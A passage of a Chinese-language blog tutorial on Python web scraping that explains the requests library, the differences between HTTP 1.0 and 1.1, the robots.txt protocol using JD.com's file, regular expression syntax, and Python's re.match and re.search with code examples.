-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span><span class="params">(url)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(url, timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 如果状态不是200，引发HTTPError异常</span></span><br><span class="line">        r.encoding = r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"产生异常"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    url = <span class="string">"http://www.baidu1.com"</span></span><br><span class="line">    print(getHTMLText(url))</span><br></pre></td></tr></table></figure>
-
-<h2 id="3-HTTP简单理解"><a href="#3-HTTP简单理解" class="headerlink" title="3.HTTP简单理解"></a>3.HTTP简单理解</h2><table>
-<thead>
-<tr>
-<th>协议类型</th>
-<th>区别</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>HTTP1.0</td>
-<td>1.0规定浏览器与服务器只保持短暂的连接，浏览器的每次请求都需要与服务器建立一个TCP连接，服务器完成请求处理后立即断开TCP连接，服务器不跟踪每个客户也不记录过去的请求。（多个TCP连接，多请求，使用后关闭）</td>
-</tr>
-<tr>
-<td>HTTP2.0</td>
-<td>1.1则支持持久连接Persistent Connection, 并且默认使用persistent  connection. 在同一个tcp的连接中可以传送多个HTTP请求和响应. 多个请求和响应可以重叠，多个请求和响应可以同时进行. 更加多的请求头和响应头(比如HTTP1.0没有host的字段).（单个TCP隧道，默认长连接，多请求。需有“Connection: close字段”，才会进行连接的关闭）通过cookie进行身份认证。</td>
-</tr>
-</tbody></table>
-<p>在1.0时的会话方式：</p>
-<ol>
-<li><p>建立连接</p>
-</li>
-<li><p>发出请求信息</p>
-</li>
-<li><p>回送响应信息</p>
-</li>
-<li><p>关掉连接</p>
-<p><strong>HTTP 1.1的持续连接，也需要增加新的请求头来帮助实现，例如，Connection请求头的值为Keep-Alive时，客户端通知服务器返回本次请求结果后保持连接；Connection请求头的值为close时，客户端通知服务器返回本次请求结果后关闭连接。**</strong>HTTP 1.1还提供了与身份认证、状态管理和Cache缓存等机制相关的请求头和响应头。</p>
-</li>
-</ol>
-<p>请求的流水线（Pipelining）处理，在一个TCP连接上可以传送多个HTTP请求和响应，减少了建立和关闭连接的消耗和延迟。例如：一个包含有许多图像的网页文件的多个请求和应答可以在一个连接中传输，但每个单独的网页文件的请求和应答仍然需要使用各自的连接。  HTTP 1.1还允许客户端不用等待上一次请求结果返回，就可以发出下一次请求，但服务器端必须按照接收到客户端请求的先后顺序依次回送响应结果，以保证客户端能够区分出每次请求的响应内容。</p>
-<p><strong>2.HTTP 1.1增加host字段</strong></p>
-<p>在HTTP1.0中认为每台服务器都绑定一个唯一的IP地址，因此，请求消息中的URL并没有传递主机名（hostname）。但随着虚拟主机技术的发展，在一台物理服务器上可以存在多个虚拟主机（Multi-homed Web Servers），并且它们共享一个IP地址。</p>
-<p> HTTP1.1的请求消息和响应消息都应支持Host头域，且请求消息中如果没有Host头域会报告一个错误（400 Bad Request）。此外，服务器应该接受以绝对路径标记的资源请求。</p>
-<p><strong>3.100(Continue) Status(节约带宽)</strong></p>
-<p>HTTP/1.1加入了一个新的状态码100（Continue）。客户端事先发送一个只带头域的请求，如果服务器因为权限拒绝了请求，就回送响应码401（Unauthorized）；如果服务器接收此请求就回送响应码100，客户端就可以继续发送带实体的完整请求了。100 (Continue) 状态代码的使用，允许客户端在发request消息body之前先用request header试探一下server，看server要不要接收request body，再决定要不要发request body。</p>
-<p><strong>4</strong>.HTTP/1.1中引入了Chunked transfer-coding来解决上面这个问题，发送方将消息分割成若干个任意大小的数据块，每个数据块在发送时都会附上块的长度，最后用一个零长度的块作为消息结束的标志。这种方法允许发送方只缓冲消息的一个片段，避免缓冲整个消息带来的过载。</p>
-<p><strong>5</strong>.HTTP/1.1在1.0的基础上加入了一些cache的新特性，当缓存对象的Age超过Expire时变为stale对象，cache不需要直接抛弃stale对象，而是与源服务器进行重新激活（revalidation）</p>
-<h5 id="HTTP协议对资源的操作"><a href="#HTTP协议对资源的操作" class="headerlink" title="HTTP协议对资源的操作"></a>HTTP协议对资源的操作</h5><table>
-<thead>
-<tr>
-<th>方法</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>GET</td>
-<td>请求获取URL位置的资源</td>
-</tr>
-<tr>
-<td>HEAD</td>
-<td>请求获取URL位置资源的响应消息报告，即获得该资源的头部信息</td>
-</tr>
-<tr>
-<td>POST</td>
-<td>请求向URL位置的资源后附加新的数据</td>
-</tr>
-<tr>
-<td>PUT</td>
-<td>请求向URL位置存储一个资源，覆盖原URL位置资源</td>
-</tr>
-<tr>
-<td>PATCH</td>
-<td>请求局部更新URL位置的资源，即改变该处资源的部分内容</td>
-</tr>
-<tr>
-<td>DELETE</td>
-<td>请求删除URL位置存储的资源</td>
-</tr>
-</tbody></table>
-<h5 id="理解PATCH和PUT区别"><a href="#理解PATCH和PUT区别" class="headerlink" title="理解PATCH和PUT区别"></a>理解PATCH和PUT区别</h5><p>　假设URL位置有一组数据UserInfo，包括UserID、UserName等20个字段。<br>　需求：用户修改了UserName，其他不变。<br>　　　　· 采用PATCH，仅向URL提交UserName的局部更新请求。<br>　　　　· 采用PUT，必须将所有20个字段一并提交到URL，未提交字段被删除。</p>
-<p>　PATCH的主要好处：节省网络带宽</p>
-<h5 id="Requests库主要方法解析"><a href="#Requests库主要方法解析" class="headerlink" title="Requests库主要方法解析"></a>Requests库主要方法解析</h5><p>requests.request(method, url, **kwargs)</p>
-<ol>
-<li><p>method：请求方式，对应get/put/post等7种<br>　例： r = requests.request(‘OPTIONS’, url, **kwargs)</p>
-</li>
-<li><p>url：拟获取页面的url链接</p>
-</li>
-<li><p>**kwargs：控制访问的参数，共13个，均为可选项</p>
-</li>
-</ol>
-<ul>
-<li>params：字典或字节序列，作为参数增加到url中；</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">kv = &#123;<span class="string">'key1'</span>:<span class="string">'value1'</span>, <span class="string">'key2'</span>:<span class="string">'value2'</span>&#125;</span><br><span class="line">r = requests.request(<span class="string">'GET'</span>, <span class="string">'http://python123.io/ws'</span>,params=kv)</span><br><span class="line">print(r.url)</span><br><span class="line"><span class="comment">#下面内容为返回内容</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">http://python123.io/ws?key1=value1&amp;key2=value2</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>data：字典、字节序列或文件对象，作为Request的内容；</p>
-</li>
-<li><p>json：JSON格式的数据，作为Request的内容；</p>
-</li>
-<li><p>headers：字典，HTTP定制头；</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hd = &#123;<span class="string">'user-agent'</span>:<span class="string">'Chrome/10'</span>&#125;</span><br><span class="line">r = requests.request(<span class="string">'POST'</span>,<span class="string">'http://www.yanlei.shop'</span>,headers=hd)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>cookies：字典或CookieJar，Request中的cookie；</p>
-</li>
-<li><p>auth：元组，支持HTTP认证功能；</p>
-</li>
-<li><p>files：字典类型，传输文件；</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fs = &#123;<span class="string">'file'</span>:open(<span class="string">'data.xls'</span>, <span class="string">'rb'</span>)&#125;</span><br><span class="line">r = requests.request(<span class="string">'POST'</span>,<span class="string">'http://python123.io/ws'</span>,files=fs)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>timeout：设定超时时间，秒为单位；</p>
-</li>
-<li><p>proxies：字典类型，设定访问代理服务器，可以增加登录认证</p>
-</li>
-<li><p>allow_redirects：True/False，默认为True，重定向开关；</p>
-</li>
-<li><p>stream：True/False，默认为True，获取内容立即下载开关；</p>
-</li>
-<li><p>verify：True/False，默认为True，认证SSL证书开关；</p>
-</li>
-<li><p>cert：本地SSL证书路径</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#方法及参数</span></span><br><span class="line">requests.get(url, params=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.head(url, **kwargs)</span><br><span class="line">requests.post(url, data=<span class="literal">None</span>, json=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.put(url, data=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.patch(url, data=<span class="literal">None</span>, **kwargs)</span><br><span class="line">requests.delete(url, **kwargs)</span><br></pre></td></tr></table></figure>
-
-<h3 id="4-Robots协议"><a href="#4-Robots协议" class="headerlink" title="4.Robots协议"></a>4.Robots协议</h3><p>Robots Exclusion Standard 网络爬虫排除标准</p>
-<p>​    作用：网站告知网络爬虫哪些页面可以抓取，哪些不行。<br>　形式：在网站根目录下的robots.txt文件。<br>　案例：京东的Robots协议<br>　<a href="http://www.jd.com/robots.txt" target="_blank" rel="noopener">http://www.jd.com/robots.txt</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 注释：*代表所有，/代表根目录</span><br><span class="line">User-agent: * </span><br><span class="line">Disallow: /?* </span><br><span class="line">Disallow: /pop/*.html </span><br><span class="line">Disallow: /pinpai/*.html?* </span><br><span class="line">User-agent: EtaoSpider </span><br><span class="line">Disallow: / </span><br><span class="line">User-agent: HuihuiSpider </span><br><span class="line">Disallow: / </span><br><span class="line">User-agent: GwdangSpider </span><br><span class="line">Disallow: / </span><br><span class="line">User-agent: WochachaSpider </span><br><span class="line">Disallow: /</span><br></pre></td></tr></table></figure>
-
-<h5 id="Robots协议的使用"><a href="#Robots协议的使用" class="headerlink" title="Robots协议的使用"></a>Robots协议的使用</h5><p>  网络爬虫：自动或人工识别robots.txt，再进行内容爬取。</p>
-<p><img src="https://boke-1259222504.cos.ap-shanghai.myqcloud.com/boke/1565232827562.png" alt="1565232827562"></p>
-<p>约束性：Robots协议是建议但非约束性，网络爬虫可以不遵守，但存在法律风险。</p>
-<h3 id="5-正则表达式"><a href="#5-正则表达式" class="headerlink" title="5.正则表达式"></a>5.正则表达式</h3><p>正则表达式(regular expression)描述了一种字符串匹配的模式（pattern），可以用来检查一个串是否含有某种子串、将匹配的子串替换或者从某个串中取出符合某个条件的子串等。</p>
-<h4 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h4><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p>
-<table>
-<thead>
-<tr>
-<th align="left">字符</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">\cx</td>
-<td align="left">匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 ‘c’ 字符。</td>
-</tr>
-<tr>
-<td align="left">\f</td>
-<td align="left">匹配一个换页符。等价于 \x0c 和 \cL。</td>
-</tr>
-<tr>
-<td align="left">\n</td>
-<td align="left">匹配一个换行符。等价于 \x0a 和 \cJ。</td>
-</tr>
-<tr>
-<td align="left">\r</td>
-<td align="left">匹配一个回车符。等价于 \x0d 和 \cM。</td>
-</tr>
-<tr>
-<td align="left">\s</td>
-<td align="left">匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。注意 Unicode 正则表达式会匹配全角空格符。</td>
-</tr>
-<tr>
-<td align="left">\S</td>
-<td align="left">匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</td>
-</tr>
-<tr>
-<td align="left">\t</td>
-<td align="left">匹配一个制表符。等价于 \x09 和 \cI。</td>
-</tr>
-<tr>
-<td align="left">\v</td>
-<td align="left">匹配一个垂直制表符。等价于 \x0b 和 \cK。</td>
-</tr>
-</tbody></table>
-<h4 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h4><p>所谓特殊字符，就是一些有特殊含义的字符，如上面说的 <strong>runoo*b</strong> 中的 <strong><strong>*，简单的说就是表示任何字符串的意思。如果要查找字符串中的 *</strong></strong> 符号，则需要对 <strong>*** 进行转义，即在其前加一个 **\</strong>: <strong>runo*ob</strong> 匹配 runo*ob。</p>
-<p>许多元字符要求在试图匹配它们时特别对待。若要匹配这些特殊字符，必须首先使字符”转义”，即，将反斜杠字符<strong>\</strong> 放在它们前面。下表列出了正则表达式中的特殊字符：</p>
-<table>
-<thead>
-<tr>
-<th align="left">特别字符</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">$</td>
-<td align="left">匹配输入字符串的结尾位置。如果设置了 RegExp 对象的 Multiline 属性，则 $ 也匹配 ‘\n’ 或 ‘\r’。要匹配 $ 字符本身，请使用 $。</td>
-</tr>
-<tr>
-<td align="left">( )</td>
-<td align="left">标记一个子表达式的开始和结束位置。子表达式可以获取供以后使用。要匹配这些字符，请使用 ( 和 )。</td>
-</tr>
-<tr>
-<td align="left">*</td>
-<td align="left">匹配前面的子表达式零次或多次。要匹配 * 字符，请使用 *。</td>
-</tr>
-<tr>
-<td align="left">+</td>
-<td align="left">匹配前面的子表达式一次或多次。要匹配 + 字符，请使用 +。</td>
-</tr>
-<tr>
-<td align="left">.</td>
-<td align="left">匹配除换行符 \n 之外的任何单字符。要匹配 . ，请使用 . 。</td>
-</tr>
-<tr>
-<td align="left">[</td>
-<td align="left">标记一个中括号表达式的开始。要匹配 [，请使用 [。</td>
-</tr>
-<tr>
-<td align="left">?</td>
-<td align="left">匹配前面的子表达式零次或一次，或指明一个非贪婪限定符。要匹配 ? 字符，请使用 ?。</td>
-</tr>
-<tr>
-<td align="left">\</td>
-<td align="left">将下一个字符标记为或特殊字符、或原义字符、或向后引用、或八进制转义符。例如， ‘n’ 匹配字符 ‘n’。’\n’ 匹配换行符。序列 ‘\‘ 匹配 “&quot;，而 ‘(‘ 则匹配 “(“。</td>
-</tr>
-<tr>
-<td align="left">^</td>
-<td align="left">匹配输入字符串的开始位置，除非在方括号表达式中使用，此时它表示不接受该字符集合。要匹配 ^ 字符本身，请使用 ^。</td>
-</tr>
-<tr>
-<td align="left">{</td>
-<td align="left">标记限定符表达式的开始。要匹配 {，请使用 {。</td>
-</tr>
-<tr>
-<td align="left">|</td>
-<td align="left">指明两项之间的一个选择。要匹配 |，请使用 |。</td>
-</tr>
-</tbody></table>
-<h4 id="限定符"><a href="#限定符" class="headerlink" title="限定符"></a>限定符</h4><p>限定符用来指定正则表达式的一个给定组件必须要出现多少次才能满足匹配。有 <strong>*** 或 **+</strong> 或 <strong>?</strong> 或 <strong>{n}</strong> 或 <strong>{n,}</strong> 或 <strong>{n,m}</strong> 共6种。</p>
-<p>正则表达式的限定符有：</p>
-<table>
-<thead>
-<tr>
-<th align="left">字符</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">*</td>
-<td align="left">匹配前面的子表达式零次或多次。例如，zo* 能匹配 “z” 以及 “zoo”。* 等价于{0,}。</td>
-</tr>
-<tr>
-<td align="left">+</td>
-<td align="left">匹配前面的子表达式一次或多次。例如，’zo+’ 能匹配 “zo” 以及 “zoo”，但不能匹配 “z”。+ 等价于 {1,}。</td>
-</tr>
-<tr>
-<td align="left">?</td>
-<td align="left">匹配前面的子表达式零次或一次。例如，”do(es)?” 可以匹配 “do” 、 “does” 中的 “does” 、 “doxy” 中的 “do” 。? 等价于 {0,1}。</td>
-</tr>
-<tr>
-<td align="left">{n}</td>
-<td align="left">n 是一个非负整数。匹配确定的 n 次。例如，’o{2}’ 不能匹配 “Bob” 中的 ‘o’，但是能匹配 “food” 中的两个 o。</td>
-</tr>
-<tr>
-<td align="left">{n,}</td>
-<td align="left">n 是一个非负整数。至少匹配n 次。例如，’o{2,}’ 不能匹配 “Bob” 中的 ‘o’，但能匹配 “foooood” 中的所有 o。’o{1,}’ 等价于 ‘o+’。’o{0,}’ 则等价于 ‘o*’。</td>
-</tr>
-<tr>
-<td align="left">{n,m}</td>
-<td align="left">m 和 n 均为非负整数，其中n &lt;= m。最少匹配 n 次且最多匹配 m 次。例如，”o{1,3}” 将匹配 “fooooood” 中的前三个 o。’o{0,1}’ 等价于 ‘o?’。请注意在逗号和两个数之间不能有空格。</td>
-</tr>
-</tbody></table>
-<h4 id="定位符"><a href="#定位符" class="headerlink" title="定位符"></a>定位符</h4><p>定位符使您能够将正则表达式固定到行首或行尾。它们还使您能够创建这样的正则表达式，这些正则表达式出现在一个单词内、在一个单词的开头或者一个单词的结尾。</p>
-<p>定位符用来描述字符串或单词的边界，<strong>^</strong> 和 <strong>$</strong> 分别指字符串的开始与结束，<strong>\b</strong> 描述单词的前或后边界，<strong>\B</strong> 表示非单词边界。</p>
-<p>正则表达式的定位符有：</p>
-<table>
-<thead>
-<tr>
-<th align="left">字符</th>
-<th align="left">描述</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">^</td>
-<td align="left">匹配输入字符串开始的位置。如果设置了 RegExp 对象的 Multiline 属性，^ 还会与 \n 或 \r 之后的位置匹配。</td>
-</tr>
-<tr>
-<td align="left">$</td>
-<td align="left">匹配输入字符串结尾的位置。如果设置了 RegExp 对象的 Multiline 属性，$ 还会与 \n 或 \r 之前的位置匹配。</td>
-</tr>
-<tr>
-<td align="left">\b</td>
-<td align="left">匹配一个单词边界，即字与空格间的位置。</td>
-</tr>
-<tr>
-<td align="left">\B</td>
-<td align="left">非单词边界匹配。</td>
-</tr>
-</tbody></table>
-<ol>
-<li>python转义字符 <ul>
-<li>正则表达式使用反斜杠” \ “来代表特殊形式或用作转义字符，这里跟Python的语法冲突，因此，Python用” \ “表示正则表达式中的” \ “，因为正则表达式中如果要匹配” \ “，需要用\来转义，变成” \ “，而Python语法中又需要对字符串中每一个\进行转义，所以就变成了” \ “。</li>
-<li>Python里的原生字符串很好地解决了这个问题，这个例子中的正则表达式可以使用r”\”表示。同样，匹配一个数字的”\d”可以写成r”\d”。有了原生字符串，妈妈也不用担心是不是漏写了反斜杠，写出来的表达式也更直观勒。</li>
-</ul>
-</li>
-<li>贪婪模式和非贪婪模式</li>
-</ol>
-<p>正则表达式通常用于在文本中查找匹配的字符串。Python里数量词默认是贪婪的（在少数语言里也可能是默认非贪婪），总是尝试匹配尽可能多的字符；非贪婪则相反，总是尝试匹配尽可能少的字符。在”*”,”?”,”+”,”{m,n}”后面加上？,使贪婪变成非贪婪。</p>
-<p>可参考： <a href="http://blog.csdn.net/zcc_0015/article/details/53671189" target="_blank" rel="noopener">python 正则表达式的贪婪匹配与非贪婪匹配</a></p>
-<h2 id="Python-Re模块"><a href="#Python-Re模块" class="headerlink" title="Python Re模块"></a>Python Re模块</h2><p><img src="https://upload-images.jianshu.io/upload_images/4340772-b0baf49f04744a80.png" alt="img"></p>
-<p>Python 自带了re模块，它提供了对正则表达式的支持。主要用到的方法列举如下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#返回pattern对象</span></span><br><span class="line">re.compile(string[,flag])  </span><br><span class="line"><span class="comment">#以下为匹配所用函数</span></span><br><span class="line">re.match(pattern, string[, flags])</span><br><span class="line">re.search(pattern, string[, flags])</span><br><span class="line">re.split(pattern, string[, maxsplit])</span><br><span class="line">re.findall(pattern, string[, flags])</span><br><span class="line">re.finditer(pattern, string[, flags])</span><br><span class="line">re.sub(pattern, repl, string[, count])</span><br><span class="line">re.subn(pattern, repl, string[, count])</span><br></pre></td></tr></table></figure>
-
-<p>在介绍这几个方法之前，我们先来介绍一下pattern的概念，pattern可以理解为一个匹配模式，那么我们怎么获得这个<strong>匹配模式</strong>呢？很简单，我们需要利用re.compile方法就可以。例如</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pattern = re.compile(<span class="string">r'hello'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>另外大家可能注意到了另一个参数 flags，在这里解释一下这个参数的含义：</p>
-<p>参数flag是匹配模式，取值可以使用按位或运算符’|’表示同时生效，比如re.I | re.M。</p>
-<p>可选值有：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">• re.I(全拼：IGNORECASE): 忽略大小写（括号内是完整写法，下同）</span><br><span class="line">• re.M(全拼：MULTILINE): 多行模式，改变<span class="string">'^'</span>和<span class="string">'$'</span>的行为（参见上图）</span><br><span class="line">• re.S(全拼：DOTALL): 点任意匹配模式，改变<span class="string">'.'</span>的行为</span><br><span class="line">• re.L(全拼：LOCALE): 使预定字符类 \w \W \b \B \s \S 取决于当前区域设定</span><br><span class="line">• re.U(全拼：UNICODE): 使预定字符类 \w \W \b \B \s \S \d \D 取决于unicode定义的字符属性</span><br><span class="line">• re.X(全拼：VERBOSE): 详细模式。这个模式下正则表达式可以是多行，忽略空白字符，并可以加入注释。</span><br></pre></td></tr></table></figure>
-
-<p>在刚才所说的另外几个方法例如 re.match 里我们就需要用到这个pattern了，下面我们一一介绍。</p>
-<h3 id="（1）re-match-pattern-string-flags"><a href="#（1）re-match-pattern-string-flags" class="headerlink" title="（1）re.match(pattern, string[, flags])"></a>（1）re.match(pattern, string[, flags])</h3><p>这个方法将会从string（我们要匹配的字符串）的开头开始，尝试匹配pattern，一直向后匹配，如果遇到无法匹配的字符，立即返回None，如果匹配未结束已经到达string的末尾，也会返回None。两个结果均表示匹配失败，否则匹配pattern成功，同时匹配终止，不再对string向后匹配。下面我们通过一个例子理解一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将正则表达式编译成Pattern对象，注意hello前面的r的意思是“原生字符串”</span></span><br><span class="line">pattern = re.compile(<span class="string">r'hello'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 使用re.match匹配文本，获得匹配结果，无法匹配时将返回None</span></span><br><span class="line">result1 = re.match(pattern,<span class="string">'hello'</span>)</span><br><span class="line">result2 = re.match(pattern,<span class="string">'helloo CQC!'</span>)</span><br><span class="line">result3 = re.match(pattern,<span class="string">'helo CQC!'</span>)</span><br><span class="line">result4 = re.match(pattern,<span class="string">'hello CQC!'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果1匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result1:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print(result1.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">'1匹配失败！'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果2匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result2:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print(result2.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print( <span class="string">'2匹配失败！'</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果3匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result3:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print( result3.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'3匹配失败！'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#如果4匹配成功</span></span><br><span class="line"><span class="keyword">if</span> result4:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print( result4.group())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print( <span class="string">'4匹配失败！'</span>)</span><br></pre></td></tr></table></figure>
-
-<p>我们还看到最后打印出了result.group()，这个是什么意思呢？下面我们说一下关于match对象的的属性和方法<br> Match对象是一次匹配的结果，包含了很多关于此次匹配的信息，可以使用Match提供的可读属性或方法来获取这些信息。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>group([group1, …]):</span><br><span class="line">获得一个或多个分组截获的字符串；指定多个参数时将以元组形式返回。group1可以使用编号也可以使用别名；编号<span class="number">0</span>代表整个匹配的子串；不填写参数时，返回group(<span class="number">0</span>)；没有截获字符串的组返回<span class="literal">None</span>；截获了多次的组返回最后一次截获的子串。</span><br><span class="line"><span class="number">2.</span>groups([default]):</span><br><span class="line">以元组形式返回全部分组截获的字符串。相当于调用group(<span class="number">1</span>,<span class="number">2</span>,…last)。default表示没有截获字符串的组以这个值替代，默认为<span class="literal">None</span>。</span><br></pre></td></tr></table></figure>
-
-<h3 id="（2）re-search-pattern-string-flags"><a href="#（2）re-search-pattern-string-flags" class="headerlink" title="（2）re.search(pattern, string[, flags])"></a>（2）re.search(pattern, string[, flags])</h3><p>search方法与match方法极其类似，区别在于match()函数只检测re是不是在string的开始位置匹配，search()会扫描整个string查找匹配，match（）只有在0位置匹配成功的话才有返回，如果不是开始位置匹配成功的话，match()就返回None。同样，search方法的返回对象同样match()返回对象的方法和属性。我们用一个例子感受一下</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将正则表达式编译成Pattern对象</span></span><br><span class="line">pattern = re.compile(<span class="string">r'world'</span>)</span><br><span class="line"><span class="comment"># 使用search()查找匹配的子串，不存在能匹配的子串时将返回None</span></span><br><span class="line"><span class="comment"># 这个例子中使用match()无法成功匹配</span></span><br><span class="line">match = re.search(pattern,<span class="string">'hello world!'</span>)</span><br><span class="line"><span class="keyword">if</span> match:</span><br><span class="line">    <span class="comment"># 使用Match获得分组信息</span></span><br><span class="line">    print( match.group())</span><br></pre></td></tr></table></figure>
-
-<h3 id="（3）re-split-pattern-string-maxsplit"><a href="#（3）re-split-pattern-string-maxsplit" class="headerlink" title="（3）re.split(pattern, string[, maxsplit])"></a>（3）re.split(pattern, string[, maxsplit])</h3><p>按照能够匹配的子串将string分割后返回列表。maxsplit用于指定最大分割次数，不指定将全部分割。我们通过下面的例子感受一下。</p>
